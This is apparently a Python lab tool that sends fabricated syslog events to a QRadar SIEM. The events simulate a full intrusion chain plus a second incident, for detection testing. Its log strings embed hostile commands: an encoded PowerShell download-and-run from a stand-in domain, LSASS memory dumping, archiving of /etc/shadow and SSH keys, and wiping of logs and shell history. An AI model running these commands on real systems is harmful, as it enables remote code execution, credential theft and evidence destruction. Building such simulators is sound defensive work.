"""Multi-stage intrusion simulator for a lab QRadar (syslog 514/udp). Dev only.

    python attack_sim.py --host 172.19.170.10            # whole chain, ~15 min
    python attack_sim.py --stage 4 --speed 4             # one stage, 4x faster
    python attack_sim.py --dry-run                        # print, send nothing

Every line uses a QRadar-native DSM format verified to parse on 7.6 CE (2026-09-19):

  host        DSM (log source type)               format                          QIDs seen
  fw-edge     Cisco ASA (41, auto-discovered)     %ASA-4-106023 / 302013 / 302014 Firewall Deny / Session Opened / Closed
  fw-pan      Palo Alto PA Series (206, auto)     PAN-OS 10 TRAFFIC csv           Session Allowed (Firewall Permit)
  DC01 FILE01 Microsoft Windows Security Event     Snare tab format                4625 User Login Failure, 4624 Success,
  WS-FIN-07   Log (12) — pre-created via API       (MSWinEventLog\\t1\\tSecurity...) 4688 / 7045 / 4663 / 1102 / 4719 parse
  srv-app01   Linux OS (11) — auto-discovery       sshd / sudo / useradd / CRON    SSH Login Failed, Accepted Password,
              mis-detects as VMWare: fix type_id                                   Privilege Escalation, User Account Added,
              via API before sending                                               User Added To Group, Cron Command

Windows sources must exist BEFORE events arrive (auto-discovery of Snare needs 25+ lines, and
the first batch lands in "SIM Generic"): POST log_source_management/log_sources with type_id 12,
protocol_type_id 0, identifier = hostname, then POST /api/staged_config/deploy_status
{"type":"INCREMENTAL"}. Coalescing off on all sim sources so eventcount == lines sent.

Rules that fire on CE defaults (enabled out of the box):
  100044 Excessive Firewall Denies from Single Source      stage 1
  100062/100065/100067 Multiple Login Failures ...          stage 4 (4625 spray), stage 5 (ssh)
  100061/100064/100066 Login Failures Followed By Success   stage 5
  100111 Remote Scanner Detected / 100109 Host Port Scan    stage 1
Stages 2/3/6/7/8 produce no offense by themselves on CE — they are the context an analyst
(or the copilot) has to pull from Ariel to see the whole chain.

Scenario: 45.142.212.100 scans fw-edge, phishes j.chen on WS-FIN-07 (winword -> powershell -enc),
beacons to C2 185.220.101.4:443, dumps lsass, sprays DC01, moves to FILE01/DC01 as svc_backup
(PsExec), brute-forces then keys into srv-app01, adds user sysadm + cron persistence, logs in to
srv-app01 straight from the C2 IP, exfiltrates D:\\Finance from FILE01 (2.3 GB to C2), then clears
DC01 audit logs and wipes /var/log on srv-app01.
"""
from __future__ import annotations

import argparse
import base64
import datetime as dt
import random
import socket
import sys
import threading
import time

ATTACKER = "45.142.212.100"
C2 = "185.220.101.4"
DC01, FILE01, WS, SRV = "10.10.1.10", "10.10.1.20", "10.10.20.57", "10.10.2.15"
FW_PUBLIC = "203.0.113.5"

ARGS: argparse.Namespace
_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
_counter = [10000]


def _ts() -> str:
    return dt.datetime.now().strftime("%b %d %H:%M:%S")


def _snare_ts() -> str:
    return dt.datetime.now().strftime("%a %b %d %H:%M:%S %Y")


def send(line: str) -> None:
    if ARGS.dry_run:
        print(line[:160])
        return
    _sock.sendto(line.encode(), (ARGS.host, ARGS.port))


def pause(seconds: float) -> None:
    """Real-time gap between events, divided by --speed."""
    if not ARGS.dry_run:
        time.sleep(seconds / ARGS.speed)


# ── formats ──────────────────────────────────────────────────────────────

def asa_deny(src: str, sport: int, dst: str, dport: int, proto: str = "tcp") -> str:
    return (f"<166>{_ts()} fw-edge %ASA-4-106023: Deny {proto} src outside:{src}/{sport} "
            f"dst inside:{dst}/{dport} by access-group \"outside_in\" [0x0, 0x0]")


def asa_built(inside_ip: str, inside_port: int, outside_ip: str, outside_port: int, conn: int) -> str:
    return (f"<166>{_ts()} fw-edge %ASA-6-302013: Built outbound TCP connection {conn} for "
            f"outside:{outside_ip}/{outside_port} ({outside_ip}/{outside_port}) to "
            f"inside:{inside_ip}/{inside_port} ({FW_PUBLIC}/{inside_port})")


def asa_teardown(inside_ip: str, inside_port: int, outside_ip: str, outside_port: int, conn: int,
                 nbytes: int, duration: str = "0:00:02") -> str:
    return (f"<166>{_ts()} fw-edge %ASA-6-302014: Teardown TCP connection {conn} for "
            f"outside:{outside_ip}/{outside_port} to inside:{inside_ip}/{inside_port} "
            f"duration {duration} bytes {nbytes} TCP FINs")


def pan_traffic(src: str, dst: str, dport: int, user: str, app: str, sent: int, recv: int) -> str:
    now = dt.datetime.now().strftime("%Y/%m/%d %H:%M:%S")
    _counter[0] += 1
    return (f"<14>{_ts()} fw-pan 1,{now},001901000123,TRAFFIC,end,2049,{now},{src},{dst},{FW_PUBLIC},{dst},"
            f"allow-out,corp\\{user},,{app},vsys1,trust,untrust,ethernet1/2,ethernet1/1,default,{now},"
            f"{_counter[0]},1,{random.randint(49152, 65535)},{dport},{random.randint(1024, 65535)},{dport},0x400053,tcp,allow,"
            f"{sent + recv},{sent},{recv},{max(3, (sent + recv) // 1400)},{now},{random.randint(1, 120)},any,0,{_counter[0]},"
            f"0x0,10.0.0.0-10.255.255.255,Netherlands,0,{max(2, sent // 1400)},{max(1, recv // 1400)},tcp-fin,0,0,0,0,,fw-pan,"
            f"from-policy,,,0,,0,,N/A,0,0,0,0")


def win(host: str, eid: int, audit: str, category: str, desc: str) -> str:
    _counter[0] += 1
    n = _counter[0]
    return (f"<13>{_ts()} {host} MSWinEventLog\t1\tSecurity\t{n}\t{_snare_ts()}\t{eid}\t"
            f"Microsoft-Windows-Security-Auditing\tN/A\tN/A\t{audit}\t{host}\t{category}\t\t{desc}\t{n}")


def w4624(host: str, user: str, src_ip: str, logon_type: int, ws: str, sid: str = "S-1-5-21-1-2-3-1105") -> str:
    return win(host, 4624, "Success Audit", "Logon",
               f"An account was successfully logged on.    Subject:   Security ID:  S-1-0-0   Account Name:  -   "
               f"Account Domain:  -   Logon ID:  0x0    Logon Type:   {logon_type}    New Logon:   Security ID:  {sid}   "
               f"Account Name:  {user}   Account Domain:  CORP   Logon ID:  0x{random.randint(0x10000, 0xFFFFF):X}   "
               f"Logon GUID:  {{00000000-0000-0000-0000-000000000000}}    Process Information:   Process ID:  0x0   "
               f"Process Name:  -    Network Information:   Workstation Name: {ws}   Source Network Address: {src_ip}   "
               f"Source Port:  {random.randint(49152, 65535)}    Detailed Authentication Information:   Logon Process:  NtLmSsp    "
               f"Authentication Package: NTLM   Transited Services: -   Package Name (NTLM only): NTLM V2   Key Length:  128")


def w4625(host: str, user: str, src_ip: str, ws: str) -> str:
    return win(host, 4625, "Failure Audit", "Logon",
               f"An account failed to log on.    Subject:   Security ID:  S-1-0-0   Account Name:  -   Account Domain:  -   "
               f"Logon ID:  0x0    Logon Type:   3    Account For Which Logon Failed:   Security ID:  S-1-0-0   "
               f"Account Name:  {user}   Account Domain:  CORP    Failure Information:   Failure Reason:  Unknown user name or bad password.   "
               f"Status:   0xC000006D   Sub Status:  0xC000006A    Process Information:   Caller Process ID: 0x0   Caller Process Name: -    "
               f"Network Information:   Workstation Name: {ws}   Source Network Address: {src_ip}   Source Port:  {random.randint(49152, 65535)}    "
               f"Detailed Authentication Information:   Logon Process:  NtLmSsp    Authentication Package: NTLM   Transited Services: -   "
               f"Package Name (NTLM only): -   Key Length:  0")


def w4688(host: str, user: str, proc: str, parent: str, cmdline: str) -> str:
    return win(host, 4688, "Success Audit", "Process Creation",
               f"A new process has been created.    Creator Subject:   Security ID:  S-1-5-21-1-2-3-1201   Account Name:  {user}   "
               f"Account Domain:  CORP   Logon ID:  0x5A2F1    Target Subject:   Security ID:  S-1-0-0   Account Name:  -   "
               f"Account Domain:  -   Logon ID:  0x0    Process Information:   New Process ID:  0x{random.randint(0x1000, 0x9FFF):x}   "
               f"New Process Name:  {proc}   Token Elevation Type:  %%1938   Mandatory Label:  S-1-16-8192   "
               f"Creator Process ID:  0x{random.randint(0x100, 0xFFF):x}   Creator Process Name:  {parent}   Process Command Line:  {cmdline}")


def w4672(host: str, user: str) -> str:
    return win(host, 4672, "Success Audit", "Special Logon",
               f"Special privileges assigned to new logon.    Subject:   Security ID:  S-1-5-21-1-2-3-1105   Account Name:  {user}   "
               f"Account Domain:  CORP   Logon ID:  0x3E7A1    Privileges:  SeSecurityPrivilege   SeBackupPrivilege   SeRestorePrivilege   "
               f"SeTakeOwnershipPrivilege   SeDebugPrivilege   SeSystemEnvironmentPrivilege   SeLoadDriverPrivilege   SeImpersonatePrivilege")


def w7045(host: str, svc: str, path: str) -> str:
    return win(host, 7045, "Success Audit", "Service Control Manager",
               f"A service was installed in the system.    Service Name:  {svc}   Service File Name:  {path}   "
               f"Service Type:  user mode service   Service Start Type:  demand start   Service Account:  LocalSystem")


def w4663(host: str, user: str, path: str, proc: str) -> str:
    return win(host, 4663, "Success Audit", "File System",
               f"An attempt was made to access an object.    Subject:   Security ID:  S-1-5-21-1-2-3-1105   Account Name:  {user}   "
               f"Account Domain:  CORP   Logon ID:  0x3E7A1    Object:   Object Server:  Security   Object Type:  File   "
               f"Object Name:  {path}   Handle ID:  0x{random.randint(0x100, 0xFFF):x}   Resource Attributes:  -    "
               f"Process Information:   Process ID:  0x2a0   Process Name:  {proc}    Access Request Information:   "
               f"Accesses:  ReadData (or ListDirectory)   Access Mask:  0x1")


def w1102(host: str, user: str) -> str:
    return win(host, 1102, "Success Audit", "Log clear",
               f"The audit log was cleared.    Subject:   Security ID:  S-1-5-21-1-2-3-1105   Account Name:  {user}   "
               f"Domain Name:  CORP   Logon ID:  0x3E7A1")


def w4719(host: str, user: str) -> str:
    return win(host, 4719, "Success Audit", "Audit Policy Change",
               f"System audit policy was changed.    Subject:   Security ID:  S-1-5-21-1-2-3-1105   Account Name:  {user}   "
               f"Account Domain:  CORP   Logon ID:  0x3E7A1    Audit Policy Change:   Category:  Logon/Logoff   Subcategory:  Logon   "
               f"Subcategory GUID:  {{0cce9215-69ae-11d9-bed3-505054503030}}   Changes:  Success removed, Failure removed")


def linux(host: str, pri: int, prog: str, msg: str) -> str:
    return f"<{pri}>{_ts()} {host} {prog}: {msg}"


def sshd(host: str, msg: str) -> str:
    return linux(host, 38, f"sshd[{random.randint(3000, 9999)}]", msg)


# ── stages ───────────────────────────────────────────────────────────────

def stage1_recon() -> None:
    """External nmap -T4 of the perimeter: 120 ports x 4 sweeps (~480 denies in 3 min) against DC01, ASA denies all.

    CE thresholds: Excessive Firewall Denies from Single Source = 400 denies / 5 min same src;
    Host Port Scan Detected by Remote Host = 60+ distinct dst ports same src / 4 min."""
    ports = sorted({21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 465, 587, 993, 995, 1433, 1521, 2049,
                    3306, 3389, 4443, 5432, 5900, 5985, 5986, 6379, 7001, 8000, 8080, 8443, 8888, 9200, 9300, 10000,
                    27017, 50000, 47001, 49152, 4444, 1080, 8009, 8081, 8181, 9090, 9443, 10443} | set(range(8000, 8072)))
    for sweep in range(4):
        for i, p in enumerate(ports):
            send(asa_deny(ATTACKER, 40000 + sweep * 1000 + i, DC01, p))
            pause(0.35)
        pause(5)


def stage2_initial_access() -> None:
    """j.chen opens the invoice .docm on WS-FIN-07; macro spawns encoded PowerShell."""
    send(w4624("WS-FIN-07", "j.chen", "127.0.0.1", 2, "WS-FIN-07", "S-1-5-21-1-2-3-1201"))
    pause(20)
    send(w4688("WS-FIN-07", "j.chen", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
               r"C:\Windows\explorer.exe", r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\j.chen\Downloads\Invoice_Q3_2026.docm"'))
    pause(35)
    enc = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('https://cdn-static-update.com/u/ld.ps1')".encode("utf-16-le")).decode()
    send(w4688("WS-FIN-07", "j.chen", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
               r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", f"powershell.exe -nop -w hidden -enc {enc}"))
    pause(3)
    send(pan_traffic(WS, C2, 443, "j.chen", "ssl", 1180, 48210))  # stager download
    pause(4)
    send(w4688("WS-FIN-07", "j.chen", r"C:\Windows\System32\rundll32.exe",
               r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"rundll32.exe C:\Users\j.chen\AppData\Roaming\Microsoft\Windows\Themes\theme.dll,DllRegisterServer"))


def beacon_loop(stop: threading.Event, count: int = 20) -> None:
    """C2 heartbeat WS-FIN-07 -> 185.220.101.4:443 every 60s, tiny regular payloads."""
    for i in range(count):
        if stop.is_set():
            return
        conn = 700000 + i
        sport = 52000 + i
        send(asa_built(WS, sport, C2, 443, conn))
        pause(2)
        send(asa_teardown(WS, sport, C2, 443, conn, 1380 + (i % 3) * 16))
        send(pan_traffic(WS, C2, 443, "j.chen", "ssl", 612, 768))
        pause(60)


def stage4_credentials() -> None:
    """LSASS dump on the workstation, then a password spray against DC01."""
    send(w4688("WS-FIN-07", "j.chen", r"C:\Users\j.chen\AppData\Local\Temp\pd.exe",
               r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"pd.exe -accepteula -ma lsass.exe C:\Users\j.chen\AppData\Local\Temp\ls.dmp"))
    pause(15)
    send(w4688("WS-FIN-07", "j.chen", r"C:\Windows\System32\rundll32.exe",
               r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\j.chen\AppData\Local\Temp\l2.dmp full"))
    pause(30)
    users = ["administrator", "svc_backup", "svc_sql", "it.admin", "m.zhang", "l.wang", "h.liu", "backup",
             "helpdesk", "finance.share", "svc_scan", "sysadmin", "j.chen", "r.zhou", "svc_ad"]
    for rnd in range(3):
        for u in users:
            send(w4625("DC01", u, WS, "WS-FIN-07"))
            pause(0.8)
        pause(10)
    pause(5)
    send(w4624("DC01", "svc_backup", WS, 3, "WS-FIN-07"))  # spray hit


def stage5_lateral() -> None:
    """svc_backup (PsExec) onto FILE01 and DC01; ssh brute-force then key login on srv-app01."""
    for host, ip in (("FILE01", FILE01), ("DC01", DC01)):
        send(w4624(host, "svc_backup", WS, 3, "WS-FIN-07"))
        send(w4672(host, "svc_backup"))
        pause(4)
        send(w7045(host, "PSEXESVC", r"%SystemRoot%\PSEXESVC.exe"))
        pause(3)
        send(w4688(host, "svc_backup", r"C:\Windows\System32\cmd.exe", r"C:\Windows\PSEXESVC.exe", "cmd.exe /c whoami /all && net group \"Domain Admins\" /domain"))
        send(pan_traffic(WS, ip, 445, "svc_backup", "msrpc", 24100, 18800))
        pause(25)
    for i in range(8):
        send(sshd("srv-app01", f"Failed password for deploy from {WS} port {41000 + i} ssh2"))
        pause(2.5)
    pause(6)
    send(sshd("srv-app01", f"Accepted publickey for deploy from {WS} port 41010 ssh2: RSA SHA256:q7Fz0m3k9pXvR2wLbT8nYc4sHd6jKe1aGf5oUi0Zx3A"))
    send(pan_traffic(WS, SRV, 22, "j.chen", "ssh", 9800, 14200))


def stage6_persistence() -> None:
    """Root via sudo, new sysadm account in sudo group, cron backdoor, then C2 IP logs straight in."""
    send(linux("srv-app01", 86, "sudo", "  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash"))
    pause(8)
    send(linux("srv-app01", 86, "useradd[4021]", "new user: name=sysadm, UID=1002, GID=1002, home=/home/sysadm, shell=/bin/bash"))
    pause(3)
    send(linux("srv-app01", 86, "usermod[4030]", "add 'sysadm' to group 'sudo'"))
    send(linux("srv-app01", 86, "passwd[4033]", "pam_unix(passwd:chauthtok): password changed for sysadm"))
    pause(5)
    send(linux("srv-app01", 78, "CRON[4100]", "(root) CMD (/usr/local/bin/.cache/update.sh >/dev/null 2>&1)"))
    send(linux("srv-app01", 86, "sudo", "  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e"))
    pause(40)
    send(asa_built(SRV, 22, C2, 40111, 800001))
    send(sshd("srv-app01", f"Accepted password for sysadm from {C2} port 40111 ssh2"))
    send(linux("srv-app01", 86, "sudo", "   sysadm : TTY=pts/1 ; PWD=/home/sysadm ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/.k.tgz /etc/shadow /root/.ssh"))


def stage7_exfil() -> None:
    """robocopy over the Finance share, then 2.3 GB to the C2 over 443, plus an SSH tunnel to the attacker."""
    files = ["Q3_payroll.xlsx", "board_minutes_2026-08.docx", "M&A_targets_draft.pptx", "bank_tokens.csv",
             "employee_master.xlsx", "vendor_contracts.zip", "tax_2025.pdf", "salary_bands.xlsx"]
    for i in range(24):
        send(w4663("FILE01", "svc_backup", rf"D:\Finance\2026\{files[i % len(files)]}", r"C:\Windows\System32\robocopy.exe"))
        pause(1.5)
    pause(10)
    for i in range(6):
        conn = 900000 + i
        send(asa_built(FILE01, 60000 + i, C2, 443, conn))
        pause(3)
        send(asa_teardown(FILE01, 60000 + i, C2, 443, conn, 391_000_000 + i * 2_400_000, "0:06:40"))
        send(pan_traffic(FILE01, C2, 443, "svc_backup", "ssl", 391_000_000 + i * 2_400_000, 152_000))
        pause(20)
    send(asa_built(WS, 53210, ATTACKER, 22, 900100))
    send(pan_traffic(WS, ATTACKER, 22, "j.chen", "ssh", 44_800, 12_100))


def stage8_antiforensics() -> None:
    """Audit log cleared on DC01, audit policy gutted, /var/log wiped on srv-app01."""
    send(w4719("DC01", "svc_backup"))
    pause(5)
    send(w1102("DC01", "svc_backup"))
    pause(8)
    send(linux("srv-app01", 86, "sudo", "   sysadm : TTY=pts/1 ; PWD=/home/sysadm ; USER=root ; COMMAND=/bin/rm -rf /var/log/auth.log /var/log/secure /var/log/wtmp /root/.bash_history"))
    send(linux("srv-app01", 86, "sudo", "   sysadm : TTY=pts/1 ; PWD=/home/sysadm ; USER=root ; COMMAND=/usr/bin/systemctl stop rsyslog"))


ATTACKER_B = "91.240.118.66"   # second, unrelated actor (Bulgaria-based scanner range)
WEB01 = "10.10.30.9"           # DMZ web host, distinct target subnet
ROGUE = "10.10.20.99"          # rogue internal host doing the RDP spray


def stage9_incident_b() -> None:
    """A SECOND, unrelated incident so the box isn't a single chain: 91.240.118.66 scans the DMZ,
    SSH-brute-forces srv-app01 (oracle) then keys in, and a rogue internal host RDP-sprays DC01
    admin accounts. Reuses only DSM formats already proven to parse; distinct actors => new offenses:
      Excessive Firewall Denies from Single Source (91.240.118.66), Multiple Login Failures from the
      Same Source + Login Failures Followed By Success (oracle@srv-app01), Multiple Login Failures to
      the Same Destination (DC01)."""
    ports = sorted({21, 22, 23, 80, 443, 445, 1433, 3306, 3389, 5432, 6379, 8080, 8443, 9200}
                   | set(range(9000, 9090)))
    for sweep in range(4):
        for i, p in enumerate(ports):
            send(asa_deny(ATTACKER_B, 45000 + sweep * 1000 + i, WEB01, p))
            pause(0.3)
        pause(4)
    pause(8)
    for i in range(12):
        send(sshd("srv-app01", f"Failed password for oracle from {ATTACKER_B} port {52000 + i} ssh2"))
        pause(2)
    pause(5)
    send(asa_built(SRV, 22, ATTACKER_B, 52020, 900500))
    send(sshd("srv-app01", f"Accepted password for oracle from {ATTACKER_B} port 52020 ssh2"))
    pause(6)
    for user in ("administrator", "backup_admin", "sqlsvc", "helpdesk", "svc_scan", "it.admin"):
        for _ in range(3):
            send(w4625("DC01", user, ROGUE, "WS-UNKNOWN"))
            pause(1.2)


STAGES = {
    1: stage1_recon, 2: stage2_initial_access, 4: stage4_credentials,
    5: stage5_lateral, 6: stage6_persistence, 7: stage7_exfil, 8: stage8_antiforensics,
    9: stage9_incident_b,
}
GAPS = {1: 90, 2: 60, 4: 60, 5: 60, 6: 90, 7: 30}  # seconds between stages (real, before --speed)


def main() -> int:
    global ARGS
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--host", default="172.19.170.10")
    ap.add_argument("--port", type=int, default=514)
    ap.add_argument("--stage", type=int, choices=sorted(STAGES), help="run one stage only (3 = C2 beacon runs alongside the chain)")
    ap.add_argument("--speed", type=float, default=1.0, help="divide every pause by this")
    ap.add_argument("--dry-run", action="store_true")
    ARGS = ap.parse_args()
    random.seed(7)

    if ARGS.stage:
        print(f"stage {ARGS.stage}: {STAGES[ARGS.stage].__doc__}")
        STAGES[ARGS.stage]()
        return 0

    stop = threading.Event()
    t0 = time.time()
    for n, fn in STAGES.items():
        print(f"[{time.time() - t0:6.0f}s] stage {n}: {fn.__doc__}", flush=True)
        fn()
        if n == 2:  # stage 3: beacon starts after initial access and runs under everything else
            print(f"[{time.time() - t0:6.0f}s] stage 3: {beacon_loop.__doc__}", flush=True)
            threading.Thread(target=beacon_loop, args=(stop,), daemon=True).start()
        pause(GAPS.get(n, 0))
    stop.set()
    print(f"[{time.time() - t0:6.0f}s] done", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
